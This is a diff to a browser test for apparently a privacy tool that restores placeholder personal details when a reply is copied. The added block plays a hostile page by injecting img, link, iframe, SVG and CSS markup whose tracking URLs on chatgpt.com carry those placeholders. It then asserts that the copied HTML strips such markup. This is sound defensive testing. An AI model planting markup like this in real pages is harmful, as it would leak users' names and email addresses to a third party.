@@ -570,6 +570,27 @@ test('copying a reply puts the real details on the clipboard; the page never see
     .map((n) => n.outerHTML ?? n.textContent).join('') + document.body.innerText);
   assert.equal(pageReadable.includes('Maria Gonzalez'), false);
 
+  // A hostile page hides placeholders in markup that loads URLs when pasted
+  // into a mail client. Only visible text is filled; risky markup is dropped.
+  const person = sent.match(/\[PERSON_\d+\]/)[0];
+  const email = sent.match(/\[EMAIL_\d+\]/)[0];
+  await reply.evaluate(({ p, e }) => {
+    document.getElementById('reply').innerHTML = `Hi ${p}<img src="https://chatgpt.com/track/i?${p}" alt="${p}">`
+      + `<a href="https://chatgpt.com/track/l?${e}" title="${e}" style="background:url(https://chatgpt.com/track/s?${p})">mail ${e}</a>`
+      + `<iframe srcdoc="${p}"></iframe><svg><image href="https://chatgpt.com/track/v?${p}"></image></svg>`;
+  }, { p: person, e: email });
+  await copyReply(reply);
+  const hostile = await reply.evaluate(async () => {
+    const [item] = await navigator.clipboard.read();
+    return (await item.getType('text/html')).text();
+  });
+  assert.doesNotMatch(hostile, /track\/|<img|<iframe|<svg|style=|href=|title=|alt=/i, `risky markup kept: ${hostile}`);
+  assert.match(hostile, /Hi Maria Gonzalez/);
+  assert.match(hostile, /mail maria@northwind\.example/);
+  assert.equal((hostile.match(/Maria Gonzalez/g) ?? []).length, 1, 'real values only in visible text');
+
+  await reply.evaluate((t) => window.showReply(t), sent);
+
   // Copying from the composer is the user's own draft: the browser copies it as is.
   await reply.evaluate((t) => { document.getElementById('plain').value = t; }, sent);
   await reply.focus('#plain');
